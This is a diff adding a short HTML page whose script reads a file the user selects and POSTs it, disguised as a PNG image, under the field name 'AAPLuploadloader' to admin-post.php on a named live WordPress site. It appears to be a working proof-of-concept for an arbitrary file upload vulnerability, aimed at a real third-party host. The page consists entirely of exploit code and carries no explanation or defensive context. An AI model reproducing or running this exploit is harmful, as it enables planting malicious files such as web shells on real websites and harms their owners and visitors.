@@ -1,0 +1,57 @@
+ï»¿<html>
+<head>
+<script>
+window.addEventListener('load', function () {
+ var file = {
+ dom : document.getElementById("file"),
+ binary : null
+ };
+ 
+ var reader = new FileReader();
+ 
+ reader.addEventListener("load", function () {
+ file.binary = reader.result;
+ });
+
+ if(file.dom.files[0]) {
+ reader.readAsBinaryString(file.dom.files[0]);
+ }
+
+ file.dom.addEventListener("change", function () {
+ if(reader.readyState === FileReader.LOADING)
+ reader.abort();
+ reader.readAsBinaryString(file.dom.files[0]);
+ });
+
+ function sendData() {
+ var xmlhttp = new XMLHttpRequest();
+ var boundary = "blob";
+ var data = "";
+ data += "--" + boundary + "\r\n";
+ data += 'content-disposition: form-data; '
+ + 'name="AAPLuploadloader"; '
+ + 'filename="' + file.dom.files[0].name + '"\r\n';
+ data += 'Content-Type: image/png\r\n';
+ data += '\r\n';
+ data += file.binary + '\r\n';
+ data += "--" + boundary + "--";
+ xmlhttp.open('POST', 'http://www.kiyimuzik.com/wp-admin/admin-post.php');
+ xmlhttp.setRequestHeader('Content-Type','multipart/form-data; boundary=' + boundary);
+ xmlhttp.send(data);
+ }
+
+ var form = document.getElementById("form");
+
+ form.addEventListener('submit', function (event) {
+ sendData();
+ });
+});
+</script>
+</head>
+<body>
+<form id="form">
+<input id="file" name="file" type="file">
+<button>Submit</button>
+</form>
+</body>
+</html>
